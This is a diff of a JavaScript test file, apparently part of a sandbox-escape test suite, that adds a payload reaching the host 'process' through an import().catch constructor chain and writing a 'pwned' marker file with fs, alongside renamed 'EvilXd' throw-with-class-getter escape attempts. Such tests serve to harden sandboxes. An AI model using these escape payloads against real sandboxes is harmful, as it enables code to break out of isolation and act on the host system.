@@ -1,5 +1,5 @@
-//process.on('unhandledRejection', (reason, promise) => { console.error('!!!! test.js unhandledRejection', promise, 'reason:', reason); });
-//process.on('uncaughtException', (reason, tag) => { console.error('????test.js uncaughtException', reason); });
+process.on('unhandledRejection', (reason, promise) => { console.error('!!!! =======> unhandledRejection', promise, 'reason:', reason); });
+process.on('uncaughtException', (reason, tag) => { console.error('???? ========> test.js uncaughtException', reason); });
 
 var argv2o=(a,m)=>(a||require('process').argv||[]).reduce((r,e)=>((m=e.match(/^(\/|--?)([\w-]*)="?(.*)"?$/))&&(r[m[2]]=m[3]),r),{});
 let assert = require('assert');
@@ -42,7 +42,13 @@ void (async () => {
         await f();
         await f();
 
-throw {message: 'EvilXd', code: class{
+try{
+import('').catch(_=>_).constructor.constructor('return process')().mainModule.require("fs").writeFileSync("pwned_AAAA_1","");
+}catch(ex){
+//console.error('AAAA catch ex',ex);
+}
+
+throw {message: 'EvilXd_AAAA', code: class{
 	static get name() {
 		(async()=>{
 			await Promise.resolve();
@@ -70,7 +76,7 @@ void (async () => {
         await f();
         await f();
         await f();
-throw {message: 'EvilXd', code: class{
+throw {message: 'EvilXd_A2', code: class{
 	static get name() {
 		(async()=>{
 			await Promise.resolve();
@@ -1556,7 +1562,7 @@ obj
   },
 
 t3:async function(){ let case_id = arguments.callee.name; var code=`
-throw {message: 'EvilXd', code: class{
+throw {message: 'EvilXd_t3', code: class{
 	static get name() {
 		(async()=>{
 			await Promise.resolve();
